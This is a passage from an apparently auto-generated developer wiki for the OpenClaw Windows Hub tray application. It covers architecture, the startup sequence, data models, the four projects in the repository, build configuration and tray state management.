| `_lastChannels` | `ChannelHealth[]` | `OnChannelHealthUpdated()` | Channel submenu |
| `_lastSessions` | `SessionInfo[]` | `OnSessionsUpdated()` | Session submenu |
| `_lastUsage` | `GatewayUsageInfo?` | `OnUsageUpdated()` | Usage display |
| `_lastNodes` | `GatewayNodeInfo[]` | `OnNodesUpdated()` | Node inventory (node mode) |

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:44-56](), [src/OpenClaw.Tray/TrayApplication.cs:26-49]()

### Session-Aware Activity Tracking

To prevent UI flickering when multiple sessions are active, the application implements **session-aware activity tracking** with a debounce mechanism:

```mermaid
stateDiagram-v2
    [*] --> Idle
    Idle --> MainActive: Main session activity
    Idle --> SubActive: Sub session activity
    
    MainActive --> MainActive: Main session continues
    MainActive --> Idle: Main session idle
    MainActive --> MainActive: Sub activity (ignore)
    
    SubActive --> MainActive: Main session activity
    SubActive --> SubActive: Sub session continues
    SubActive --> Idle: Sub session idle (after debounce)
    
    note right of SubActive
        Debounce: 3 seconds
        Prevents flip-flopping
    end note
```

**Algorithm:**
1. Main session activity always takes priority
2. If current session is still active, keep displaying it (debounce 3s)
3. Only switch to a different session if debounce window has elapsed
4. Fall back to idle when no sessions are active

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:58-62](), [src/OpenClaw.Tray/TrayApplication.cs:564-612]()

---

## Initialization Sequence

### WinUI Application Startup

```mermaid
sequenceDiagram
    participant Main as "Main()"
    participant App as "App.xaml.cs"
    participant Settings as "SettingsManager"
    participant Mutex as "Mutex"
    participant Updater as "UpdatumManager"
    participant Gateway as "OpenClawGatewayClient"
    participant Node as "NodeService"
    participant UI as "Tray Icon & Menu"
    
    Main->>App: new App()
    App->>App: InitializeComponent()
    App->>App: CheckPreviousRun()
    App->>App: MarkRunStarted()
    
    Main->>App: OnLaunched()
    App->>App: GetProtocolActivationUri()
    App->>Mutex: new Mutex("OpenClawTray")
    
    alt Single instance
        App->>Updater: CheckForUpdatesAsync()
        Updater-->>App: shouldLaunch = true
        
        App->>Settings: new SettingsManager()
        
        alt First run (no token)
            App->>UI: ShowFirstRunWelcomeAsync()
        end
        
        App->>UI: InitializeTrayIcon()
        App->>UI: InitializeTrayMenuWindow()
        
        alt EnableNodeMode = true
            App->>Node: InitializeNodeService()
            Node->>Gateway: ConnectAsync() (node role)
        else EnableNodeMode = false
            App->>Gateway: InitializeGatewayClient()
            Gateway->>Gateway: ConnectAsync() (operator role)
        end
        
        App->>App: StartHealthCheckTimer()
        App->>App: StartDeepLinkServer()
        
        alt Global hotkey enabled
            App->>App: RegisterGlobalHotkey()
        end
    else Already running
        App->>App: SendDeepLinkToRunningInstance()
        App->>App: Exit()
    end
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:209-300]()

---

## Data Models

The `OpenClaw.Shared` library defines several key data models used throughout the application:

### Core Models

| Model | Purpose | Key Properties |
|-------|---------|----------------|
| `SessionInfo` | Represents an agent session | `Key`, `IsMain`, `Channel`, `Model`, `TotalTokens`, `Status` |
| `ChannelHealth` | Represents a channel's health | `Name`, `Status`, `IsLinked`, `AuthAge`, `Error` |
| `AgentActivity` | Represents current agent activity | `Kind`, `IsMain`, `SessionKey`, `Label`, `State` |
| `GatewayUsageInfo` | Represents usage statistics | `TotalTokens`, `CostUsd`, `RequestCount`, `Model` |
| `OpenClawNotification` | Represents a notification | `Title`, `Message`, `Type` |
| `GatewayNodeInfo` | Represents a connected node | `NodeId`, `DisplayName`, `IsOnline`, `Platform` |

**Display Helpers:** Each model provides computed properties for UI display:
- `SessionInfo.DisplayText`: "Main · telegram · 💻 Running"
- `ChannelHealth.DisplayText`: "[ON] Telegram"
- `AgentActivity.DisplayText`: "Main · 💻 Running command"
- `GatewayUsageInfo.DisplayText`: "Tokens: 5.0K ($0.25) · 42 requests"

**Sources:** [tests/OpenClaw.Shared.Tests/ModelsTests.cs:6-797]()

### ActivityKind Enumeration

Agent activities are categorized by kind, each with a corresponding emoji glyph:

| Kind | Glyph | Usage |
|------|-------|-------|
| `Idle` | (empty) | No activity |
| `Job` | ⚡ | Agent job processing |
| `Tool` | 🛠️ | Tool invocation |
| `Exec` | 💻 | Command execution |
| `Read` | 📄 | File read |
| `Write` | ✍️ | File write |
| `Edit` | 📝 | File edit |
| `Search` | 🔍 | Search operation |
| `Browser` | 🌐 | Browser interaction |
| `Message` | 💬 | Message sent |

**Sources:** [tests/OpenClaw.Shared.Tests/ModelsTests.cs:6-76]()

---

## Window Management

The WinUI application uses a **window reuse pattern** to avoid crashes during window creation after idle periods.

### Window Lifecycle

```mermaid
stateDiagram-v2
    [*] --> Created: InitializeTrayMenuWindow()
    Created --> Hidden: Pre-created at startup
    Hidden --> Visible: ShowAtCursor()
    Visible --> Hidden: Deactivated event
    Hidden --> Visible: ShowAtCursor() (reused)
    
    note right of Hidden
        Window is never disposed
        Just hidden/shown
        Content rebuilt each time
    end note
```

**Key Windows:**
- `_keepAliveWindow`: Hidden 1x1 window to anchor WinUI runtime
- `_trayMenuWindow`: Pre-created popup menu, reused on every click
- `_settingsWindow`: Created on demand, disposed on close
- `_webChatWindow`: Created on demand, disposed on close
- `_statusDetailWindow`: Created on demand, disposed on close

**Pattern:** The tray menu window is created once at startup (`InitializeTrayMenuWindow()`) and reused to avoid threading issues with WinUI window creation.

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:302-336](), [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs:79-103]()

---

## Request Tracking

The `OpenClawGatewayClient` tracks pending requests to correlate responses with their original method calls:

```mermaid
graph TB
    SendRequest["SendTrackedRequestAsync(method, params)"]
    GenerateId["requestId = Guid.NewGuid()"]
    TrackRequest["_pendingRequestMethods[requestId] = method"]
    Send["SendRawAsync(json)"]
    
    ReceiveResponse["HandleResponse(root)"]
    LookupMethod["TakePendingRequestMethod(requestId)"]
    HandleKnown["HandleKnownResponse(method, payload)"]
    
    SendRequest --> GenerateId
    GenerateId --> TrackRequest
    TrackRequest --> Send
    
    ReceiveResponse --> LookupMethod
    LookupMethod --> HandleKnown
    
    HandleKnown -->|"sessions.list"| ParseSessions
    HandleKnown -->|"health"| ParseChannels
    HandleKnown -->|"usage"| ParseUsage
    HandleKnown -->|"node.list"| ParseNodes
```

**Purpose:** The tracking dictionary `_pendingRequestMethods` maps request IDs to method names, enabling the client to invoke the correct parser when a response arrives.

**Cleanup:** Requests are removed from tracking on response or error.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:385-470]()

---

## Unsupported Method Detection

The client gracefully handles gateway versions that don't support newer methods:

```mermaid
graph TB
    SendRequest["Send request (e.g., usage.status)"]
    Response["Receive response"]
    CheckOk["ok = false?"]
    ErrorCheck["Error contains 'unknown method'?"]
    MarkUnsupported["_usageStatusUnsupported = true"]
    Fallback["Fallback to legacy method"]
    
    SendRequest --> Response
    Response --> CheckOk
    CheckOk -->|Yes| ErrorCheck
    CheckOk -->|No| ParsePayload
    
    ErrorCheck -->|Yes| MarkUnsupported
    ErrorCheck -->|No| LogError
    
    MarkUnsupported --> Fallback
```

**Tracked Flags:**
- `_usageStatusUnsupported`: Falls back to `usage` (legacy)
- `_usageCostUnsupported`: Stops requesting cost data
- `_sessionPreviewUnsupported`: Stops requesting previews
- `_nodeListUnsupported`: Stops requesting node inventory

**Reset:** Flags are cleared on reconnect to allow detection of gateway upgrades.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:34-44](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:659-704]()

---

## Summary

The OpenClaw Windows Hub architecture is built on these key principles:

1. **Layered Design:** Shared library (`OpenClaw.Shared`) supporting multiple UI implementations
2. **Event-Driven Communication:** WebSocket events marshaled to UI thread via `SynchronizationContext` or `DispatcherQueue`
3. **Dual Operation Modes:** Operator mode (monitoring) and node mode (remote control) with separate WebSocket clients
4. **State Caching:** Local cache of gateway data for instant menu display
5. **Window Reuse:** Pre-created windows to avoid threading issues in WinUI
6. **Request Tracking:** Correlation of responses to requests via request ID mapping
7. **Graceful Degradation:** Detection and fallback for unsupported gateway methods

This architecture enables a responsive, reliable Windows companion for OpenClaw that can operate both as a monitoring dashboard and as a remotely controllable node.

---

# Page: Projects & Components

# Projects & Components

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [README.md](README.md)
- [build.ps1](build.ps1)
- [docs/VERSIONING.md](docs/VERSIONING.md)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)
- [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj](src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj)
- [src/OpenClaw.Tray.WinUI/Package.appxmanifest](src/OpenClaw.Tray.WinUI/Package.appxmanifest)
- [src/OpenClaw.Tray/OpenClaw.Tray.csproj](src/OpenClaw.Tray/OpenClaw.Tray.csproj)

</details>



This page documents the four projects in the OpenClaw Windows Hub monorepo, their purposes, key dependencies, and outputs. For information about the overall system architecture, see [System Architecture](#1.1). For build and distribution processes, see [Build & Distribution](#6).

## Monorepo Structure

The repository follows a standard .NET solution structure with four projects under `src/`:

```
openclaw-windows-node/
├── src/
│   ├── OpenClaw.Shared/           # Shared library (gateway client, data models)
│   ├── OpenClaw.Tray.WinUI/        # Modern WinUI tray application
│   ├── OpenClaw.Tray/              # Legacy WinForms tray application
│   └── OpenClaw.CommandPalette/    # PowerToys Command Palette extension
├── build.ps1                        # Build script
└── openclaw-windows-node.sln       # Solution file
```

All projects target `.NET 10.0` and are designed for Windows 10 (19041+) and Windows 11.

**Sources:** [README.md:280-292]()

---

## Project Dependency Graph

```mermaid
graph TB
    Shared["OpenClaw.Shared<br/>(Class Library)"]
    TrayWinUI["OpenClaw.Tray.WinUI<br/>(WinUI Application)"]
    TrayWinForms["OpenClaw.Tray<br/>(WinForms Application)"]
    CommandPalette["OpenClaw.CommandPalette<br/>(PowerToys Extension)"]
    
    TrayWinUI -->|ProjectReference| Shared
    TrayWinForms -->|ProjectReference| Shared
    CommandPalette -->|ProjectReference| Shared
    
    subgraph "NuGet Dependencies (WinUI)"
        WindowsAppSDK["Microsoft.WindowsAppSDK"]
        WinUIEx["WinUIEx"]
        ToolkitNotif["Microsoft.Toolkit.Uwp.Notifications"]
        Updatum["Updatum"]
    end
    
    subgraph "NuGet Dependencies (WinForms)"
        WebView2["Microsoft.Web.WebView2"]
        ToolkitNotif2["Microsoft.Toolkit.Uwp.Notifications"]
        Updatum2["Updatum"]
    end
    
    subgraph "NuGet Dependencies (Shared)"
        NSec["NSec.Cryptography"]
    end
    
    TrayWinUI --> WindowsAppSDK
    TrayWinUI --> WinUIEx
    TrayWinUI --> ToolkitNotif
    TrayWinUI --> Updatum
    
    TrayWinForms --> WebView2
    TrayWinForms --> ToolkitNotif2
    TrayWinForms --> Updatum2
    
    Shared --> NSec
```

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:34-44](), [src/OpenClaw.Tray/OpenClaw.Tray.csproj:23-32](), [src/OpenClaw.Shared/OpenClaw.Shared.csproj:14-16]()

---

## OpenClaw.Shared

**Type:** Class Library  
**Target Framework:** `net10.0`  
**Project File:** [src/OpenClaw.Shared/OpenClaw.Shared.csproj]()

### Purpose

Provides shared functionality used by all UI applications, including:
- WebSocket client for communicating with the OpenClaw Gateway
- Node client for device pairing and capability registration
- Data models for sessions, channels, usage, and activity
- URL validation and normalization helpers
- Device identity and Ed25519 cryptographic authentication

This library has no UI dependencies and can be referenced by both WinUI and WinForms projects.

### Key Components

| Component | Purpose |
|-----------|---------|
| `OpenClawGatewayClient` | WebSocket client for operator mode, handles events and requests |
| `WindowsNodeClient` | WebSocket client for node mode, manages device pairing |
| `DeviceIdentity` | Ed25519 keypair generation and persistent storage |
| `SessionInfo`, `ChannelHealth`, `GatewayUsageInfo` | Data models for gateway responses |
| `AgentActivity` | Real-time activity event model |
| `GatewayUrlHelper` | URL parsing, normalization, credential extraction |

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| `NSec.Cryptography` | 25.4.0 | Ed25519 key generation and signing for device authentication |

### Test Visibility

The project exposes internals to `OpenClaw.Shared.Tests` via `InternalsVisibleTo` for unit testing.

**Sources:** [src/OpenClaw.Shared/OpenClaw.Shared.csproj](), [README.md:269-276]()

---

## OpenClaw.Tray.WinUI

**Type:** WinUI 3 Application  
**Target Framework:** `net10.0-windows10.0.19041.0`  
**Project File:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj]()  
**Output:** `OpenClaw.Tray.WinUI.exe` (self-contained)

### Purpose

Modern Windows 11-style system tray application with WinUI 3. This is the primary tray application, offering a rich UI experience with modern Windows integration.

### Build Modes

The project supports two packaging modes controlled by the `PackageMsix` property:

| Mode | Description | WindowsPackageType | Use Case |
|------|-------------|-------------------|----------|
| **Unpackaged** (default) | Traditional EXE distribution | `None` | Portable deployment, Inno Setup installers |
| **MSIX Packaged** | Modern package format | `MSIX` | Camera/mic consent prompts, Microsoft Store |

Unpackaged builds use an [app.manifest]() for traditional deployment. MSIX builds use [Package.appxmanifest]() for package identity and capabilities.

### Architecture Requirements

Unlike WinForms, the WinUI project **requires a runtime identifier** (`-r win-x64` or `-r win-arm64`) during build for proper WebView2 support. The build script automatically detects the architecture and sets the appropriate RID.

```powershell
# Automatic RID selection in build.ps1
$rid = if ($arch -eq "ARM64") { "win-arm64" } else { "win-x64" }
dotnet build src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj -c Release -r $rid
```

### WebView2Loader Special Handling

For unpackaged builds, a custom MSBuild target copies the architecture-specific `WebView2Loader.dll` from the `runtimes/` folder to the output root:

```xml
<!-- Detect ARM64 vs x64 -->
<IsArm64Build Condition="'$(Platform)' == 'ARM64' OR '$(RuntimeIdentifier)' == 'win-arm64'">true</IsArm64Build>

<!-- Copy from runtimes/win-arm64/native/ or runtimes/win-x64/native/ -->
<WebView2LoaderSource Condition="'$(IsArm64Build)' == 'true'">$(OutputPath)runtimes\win-arm64\native\WebView2Loader.dll</WebView2LoaderSource>
<WebView2LoaderSource Condition="'$(WebView2LoaderSource)' == ''">$(OutputPath)runtimes\win-x64\native\WebView2Loader.dll</WebView2LoaderSource>
```

This ensures the WebView2 runtime can locate the loader when running as an unpackaged app.

### Key Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| `Microsoft.WindowsAppSDK` | 1.8.260101001 | WinUI 3 runtime and controls |
| `WinUIEx` | 2.9.0 | Window management extensions (tray icon support) |
| `Microsoft.Toolkit.Uwp.Notifications` | 7.1.3 | Toast notification API |
| `Updatum` | 1.3.4 | Auto-update from GitHub Releases |

### MSIX Capabilities

When built as MSIX ([Package.appxmanifest:56-61]()), the package declares:

- `internetClient` - Network access
- `runFullTrust` - Full trust desktop application
- `webcam` - Camera access (triggers consent prompt)
- `microphone` - Microphone access (triggers consent prompt)

The MSIX package also registers the `openclaw://` protocol for deep link handling.

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj](), [src/OpenClaw.Tray.WinUI/Package.appxmanifest](), [build.ps1:151-156](), [build.ps1:188-193]()

---

## OpenClaw.Tray

**Type:** Windows Forms Application  
**Target Framework:** `net10.0-windows10.0.19041.0`  
**Project File:** [src/OpenClaw.Tray/OpenClaw.Tray.csproj]()  
**Output:** `OpenClaw.Tray.exe` (single-file, self-contained)

### Purpose

Legacy WinForms-based tray application for compatibility with older systems or users who prefer the classic Windows UI. Shares the same core functionality as the WinUI version through `OpenClaw.Shared`.

### Build Configuration

The project is configured for single-file deployment:

```xml
<PublishSingleFile>true</PublishSingleFile>
<SelfContained>true</SelfContained>
```

The runtime identifier (win-x64 or win-arm64) is set at publish time, not in the project file. Unlike WinUI, WinForms builds work without an explicit RID during development.

### Key Differences from WinUI

| Feature | WinUI | WinForms |
|---------|-------|----------|
| UI Framework | WinUI 3 (modern) | Windows Forms (classic) |
| Build RID | **Required** | Optional (set at publish) |
| Package Format | Unpackaged or MSIX | Unpackaged only |
| Single-File | Via publish | Built-in |
| Menu Style | Flyout with dark/light mode | Classic context menu |

### Key Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| `Microsoft.Web.WebView2` | 1.0.3124.44 | Embedded browser for chat window |
| `Microsoft.Toolkit.Uwp.Notifications` | 7.1.3 | Toast notifications (same API as WinUI) |
| `Updatum` | 1.3.4 | Auto-update system |

### Icons

The WinForms project embeds icon resources directly:

```xml
<ItemGroup>
  <EmbeddedResource Include="Icons\*.ico" />
</ItemGroup>
```

**Sources:** [src/OpenClaw.Tray/OpenClaw.Tray.csproj](), [README.md:72-100]()

---

## OpenClaw.CommandPalette

**Type:** PowerToys Command Palette Extension (MSIX)  
**Target Framework:** `net10.0-windows10.0.19041.0`  
**Project File:** [src/OpenClaw.CommandPalette/OpenClaw.CommandPalette.csproj]()

### Purpose

PowerToys Command Palette plugin that provides quick OpenClaw commands accessible via `Win+Alt+Space`. Users can type "OpenClaw" to see available actions without opening the tray application.

### Available Commands

| Command | Action | Deep Link |
|---------|--------|-----------|
| 🦞 Open Dashboard | Launch web dashboard | `openclaw://dashboard` |
| 💬 Quick Send | Send a message | `openclaw://send` |
| 📊 Full Status | View gateway status | `openclaw://settings` |
| ⚡ Sessions | View active sessions | `openclaw://dashboard/sessions` |
| 📡 Channels | View channel health | `openclaw://dashboard/channels` |
| 🔄 Health Check | Trigger health refresh | (API call) |

### Deployment

The extension is packaged as an MSIX and deployed via Visual Studio or PowerToys plugin manager. It communicates with the tray application via:
1. Deep links (`openclaw://`) for UI actions
2. Direct `OpenClawGatewayClient` calls for status queries

### Dependencies

Shares the same `OpenClaw.Shared` reference as the tray applications, allowing it to make direct WebSocket calls to the gateway for real-time status information.

**Sources:** [README.md:251-268](), [README.md:238-249]()

---

## Build Output Artifacts

```mermaid
graph LR
    subgraph "Source Projects"
        SharedSrc["OpenClaw.Shared.csproj"]
        WinUISrc["OpenClaw.Tray.WinUI.csproj"]
        WinFormsSrc["OpenClaw.Tray.csproj"]
        CmdPalSrc["OpenClaw.CommandPalette.csproj"]
    end
    
    subgraph "Build Modes"
        UnpackagedWinUI["Unpackaged Build<br/>PackageMsix=false"]
        MSIXWinUI["MSIX Build<br/>PackageMsix=true"]
        WinFormsBuild["Single-File Publish"]
    end
    
    subgraph "Output Artifacts"
        WinUIExe["OpenClaw.Tray.WinUI.exe<br/>(self-contained, RID-specific)"]
        WinUIMSIX["OpenClaw.Tray_0.4.4.0_x64.msix<br/>(signed package)"]
        WinFormsExe["OpenClaw.Tray.exe<br/>(single-file, self-contained)"]
        CmdPalMSIX["OpenClaw.CommandPalette.msix<br/>(PowerToys extension)"]
    end
    
    WinUISrc --> UnpackagedWinUI
    WinUISrc --> MSIXWinUI
    WinFormsSrc --> WinFormsBuild
    CmdPalSrc --> CmdPalMSIX
    
    UnpackagedWinUI --> WinUIExe
    MSIXWinUI --> WinUIMSIX
    WinFormsBuild --> WinFormsExe
    
    SharedSrc -.->|referenced by| WinUISrc
    SharedSrc -.->|referenced by| WinFormsSrc
    SharedSrc -.->|referenced by| CmdPalSrc
```

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:16-32](), [src/OpenClaw.Tray/OpenClaw.Tray.csproj:18-20]()

---

## Version Synchronization

All projects share a common version number defined in their `.csproj` files:

```xml
<Version>0.4.4</Version>
```

During CI builds, GitVersion overrides this via the `-p:Version=` argument, ensuring all assemblies have consistent version metadata. The MSIX package requires a 4-part version (`X.Y.Z.0`), which is patched in `Package.appxmanifest` during the build process.

For details on versioning strategy, see [Versioning & Updates](#6.4).

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:12](), [src/OpenClaw.Tray/OpenClaw.Tray.csproj:17](), [docs/VERSIONING.md]()

---

## Code Entity Mapping

```mermaid
graph TB
    subgraph "Application Entry Points"
        WinUIApp["App.xaml.cs<br/>(WinUI)"]
        WinFormsProgram["Program.cs<br/>(WinForms)"]
        CmdPalProvider["OpenClawProvider<br/>(Command Palette)"]
    end
    
    subgraph "OpenClaw.Shared Classes"
        GatewayClient["OpenClawGatewayClient"]
        NodeClient["WindowsNodeClient"]
        DeviceId["DeviceIdentity"]
        SessionInfo["SessionInfo"]
        ChannelHealth["ChannelHealth"]
        AgentActivity["AgentActivity"]
    end
    
    subgraph "Capabilities (Node Mode)"
        SystemCap["SystemCapability"]
        CanvasCap["CanvasCapability"]
        ScreenCap["ScreenCapability"]
        CameraCap["CameraCapability"]
    end
    
    WinUIApp --> GatewayClient
    WinUIApp --> NodeClient
    WinFormsProgram --> GatewayClient
    WinFormsProgram --> NodeClient
    CmdPalProvider --> GatewayClient
    
    NodeClient --> DeviceId
    NodeClient --> SystemCap
    NodeClient --> CanvasCap
    NodeClient --> ScreenCap
    NodeClient --> CameraCap
    
    GatewayClient --> SessionInfo
    GatewayClient --> ChannelHealth
    GatewayClient --> AgentActivity
```

This diagram shows how the main entry points (`App.xaml.cs`, `Program.cs`, `OpenClawProvider`) consume shared library classes and how the node client orchestrates capabilities.

**Sources:** [README.md:269-276](), [README.md:136-146]()

---

# Page: Tray Application

# Tray Application

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/OpenClawGatewayClient.cs](src/OpenClaw.Shared/OpenClawGatewayClient.cs)
- [src/OpenClaw.Tray.WinUI/App.xaml.cs](src/OpenClaw.Tray.WinUI/App.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs](src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs)
- [src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs)
- [src/OpenClaw.Tray/DEVELOPMENT.md](src/OpenClaw.Tray/DEVELOPMENT.md)
- [src/OpenClaw.Tray/README.md](src/OpenClaw.Tray/README.md)
- [src/OpenClaw.Tray/TrayApplication.cs](src/OpenClaw.Tray/TrayApplication.cs)
- [tests/OpenClaw.Shared.Tests/ModelsTests.cs](tests/OpenClaw.Shared.Tests/ModelsTests.cs)

</details>



This page documents the main tray application that runs in the Windows system tray, providing users with quick access to OpenClaw functionality. The tray application serves as the primary interface for monitoring gateway status, viewing agent activity, managing sessions, and interacting with the AI assistant.

For details on specific aspects of the tray application:
- Application startup, shutdown, and lifecycle management: see [Application Lifecycle](#2.1)
- Tray icon states, badges, and menu construction: see [System Tray Icon & Menu](#2.2)
- Embedded WebView2 chat interface: see [Web Chat Window](#2.3)
- Quick message sending dialog: see [Quick Send Dialog](#2.4)
- Toast notifications and history: see [Notifications & History](#2.5)

For gateway WebSocket communication protocol details, see [Gateway Communication](#3).  
For Node Mode capabilities and remote control features, see [Node Mode](#4).  
For settings persistence and configuration, see [Configuration & Settings](#5).

## Dual Implementation Strategy

The codebase maintains two separate tray application implementations that share a common backend library:

| Implementation | Project | UI Framework | Target Scenario |
|----------------|---------|--------------|-----------------|
| **Modern** | `OpenClaw.Tray.WinUI` | WinUI 3 | Primary application, MSIX packaging, modern Windows 11 experience |
| **Legacy** | `OpenClaw.Tray` | Windows Forms | Fallback option, portable single-file EXE, broader compatibility |

Both implementations:
- Share `OpenClaw.Shared` library for gateway communication and data models
- Support the same core features (notifications, chat, quick send, settings)
- Use identical gateway protocol and authentication
- Store settings in the same JSON format

The WinUI implementation is the recommended version, offering better integration with Windows 11 features like Mica backdrop, modern theming, and MSIX deployment with automatic updates.

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:1-300](), [src/OpenClaw.Tray/TrayApplication.cs:1-100](), [src/OpenClaw.Tray/README.md:1-50]()

## Operating Modes

The tray application operates in one of two mutually exclusive modes:

### Operator Mode (Default)

In Operator Mode, the application acts as a monitoring and control interface for the gateway. It displays real-time status, sessions, and activity but does not expose the local Windows PC as a remotely controllable node.

**Features:**
- Session list and management
- Channel health monitoring
- Usage tracking and cost display
- Quick send messages to agent
- Embedded web chat window
- Notification delivery
- Dashboard access

### Node Mode (Experimental)

When Node Mode is enabled in settings, the Windows PC registers itself with the gateway as a controllable node. The gateway can invoke commands to control the PC remotely (notifications, screenshots, camera, canvas, system execution).

**Features:**
- All Operator Mode features
- Capability registration (`system`, `canvas`, `screen`, `camera`)
- Device pairing with Ed25519 authentication
- Command execution with approval policies
- Remote WebView2 control (canvas capability)

**Mutual Exclusion:** The application uses either `OpenClawGatewayClient` (Operator Mode) or `WindowsNodeClient` (Node Mode), never both simultaneously, to avoid gateway connection conflicts.

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:263-274](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:72-73]()

## Architecture Overview

```mermaid
graph TB
    subgraph "Application Entry"
        App["App (WinUI)<br/>Application class"]
        Program["Program (WinForms)<br/>Main entry point"]
    end
    
    subgraph "Core Application State"
        AppState["Application State<br/>_currentStatus<br/>_currentActivity<br/>_lastSessions<br/>_lastChannels<br/>_lastUsage"]
        Settings["SettingsManager<br/>JSON persistence"]
        Logger["Logger<br/>File rotation"]
    end
    
    subgraph "Gateway Communication"
        GatewayClient["OpenClawGatewayClient<br/>WebSocket client"]
        NodeClient["WindowsNodeClient<br/>Node mode client"]
    end
    
    subgraph "UI Components"
        TrayIcon["TrayIcon (WinUI)<br/>NotifyIcon (WinForms)"]
        TrayMenu["TrayMenuWindow<br/>ModernTrayMenu"]
        WebChat["WebChatWindow<br/>WebChatForm"]
        QuickSend["QuickSendDialog"]
        StatusDetail["StatusDetailWindow"]
        NotifHistory["NotificationHistoryWindow"]
    end
    
    subgraph "System Integration"
        GlobalHotkey["GlobalHotkeyService<br/>Ctrl+Alt+Shift+C"]
        DeepLink["DeepLinkHandler<br/>openclaw:// protocol"]
        ToastMgr["ToastNotificationManagerCompat<br/>Windows notifications"]
        AutoStart["AutoStartManager<br/>Registry integration"]
    end
    
    App --> AppState
    Program --> AppState
    AppState --> Settings
    AppState --> Logger
    
    App --> GatewayClient
    App -.->|"EnableNodeMode=true"| NodeClient
    
    GatewayClient -->|"Events"| AppState
    NodeClient -->|"Events"| AppState
    
    AppState --> TrayIcon
    TrayIcon -->|"Click"| TrayMenu
    TrayIcon -->|"Double-click"| WebChat
    
    TrayMenu -->|"Menu actions"| QuickSend
    TrayMenu -->|"Menu actions"| StatusDetail
    TrayMenu -->|"Menu actions"| NotifHistory
    
    AppState --> ToastMgr
    GlobalHotkey -->|"Hotkey pressed"| QuickSend
    DeepLink -->|"openclaw://"| QuickSend
    
    Settings --> AutoStart
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:24-76](), [src/OpenClaw.Tray/TrayApplication.cs:16-56]()

## Main Application Class (WinUI)

The `App` class in [src/OpenClaw.Tray.WinUI/App.xaml.cs]() serves as the application entry point and lifetime manager.

### Key Fields

```csharp
// Core services
private TrayIcon? _trayIcon;
private OpenClawGatewayClient? _gatewayClient;
private SettingsManager? _settings;
private NodeService? _nodeService;

// Application state
private ConnectionStatus _currentStatus;
private AgentActivity? _currentActivity;
private ChannelHealth[] _lastChannels;
private SessionInfo[] _lastSessions;
private GatewayUsageInfo? _lastUsage;

// Windows (created on demand)
private SettingsWindow? _settingsWindow;
private WebChatWindow? _webChatWindow;
private TrayMenuWindow? _trayMenuWindow;

// Keep-alive anchor
private Window? _keepAliveWindow;
```

### Single Instance Enforcement

The application uses a `Mutex` to prevent multiple instances from running simultaneously:

[src/OpenClaw.Tray.WinUI/App.xaml.cs:217-230]()

If a second instance is launched, it forwards any deep link arguments to the running instance via named pipe IPC, then exits immediately.

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:209-245]()

## Application State Management

The tray application maintains several categories of state, synchronized from gateway events:

### Connection State

| Field | Type | Purpose |
|-------|------|---------|
| `_currentStatus` | `ConnectionStatus` | WebSocket connection state (Connected, Connecting, Error, Disconnected) |
| `_lastCheckTime` | `DateTime` | Timestamp of last health check |
| `_reconnectAttempts` | `int` | Retry counter for exponential backoff |

### Activity State (Session-Aware)

```csharp
// Per-session activity tracking
private readonly Dictionary<string, AgentActivity> _sessionActivities = new();

// Currently displayed session (with debounce)
private string? _displayedSessionKey;
private DateTime _lastSessionSwitch;
private static readonly TimeSpan SessionSwitchDebounce = TimeSpan.FromSeconds(3);
```

Activity tracking prevents rapid switching between sessions during concurrent agent operations. The display logic:

1. Main session activity always takes priority
2. Current displayed session is preserved if still active (prevents flip-flopping)
3. Falls back to most recently active sub-session
4. 3-second debounce window prevents UI jitter

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:58-63](), [src/OpenClaw.Tray/TrayApplication.cs:30-35]()

### Gateway State Cache

```csharp
private ChannelHealth[] _lastChannels = Array.Empty<ChannelHealth>();
private SessionInfo[] _lastSessions = Array.Empty<SessionInfo>();
private GatewayNodeInfo[] _lastNodes = Array.Empty<GatewayNodeInfo>();
private GatewayUsageInfo? _lastUsage;
private GatewayUsageStatusInfo? _lastUsageStatus;
private GatewayCostUsageInfo? _lastUsageCost;
```

These fields cache the most recent data from the gateway, updated via event handlers when new data arrives. The cache is used for:
- Tray menu construction (sessions, channels, usage display)
- Status detail window content
- Activity stream logging

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:44-56]()

## Window Management Pattern

The WinUI application uses a singleton window pattern for all UI surfaces to avoid crashes related to window creation after idle periods.

### Keep-Alive Window

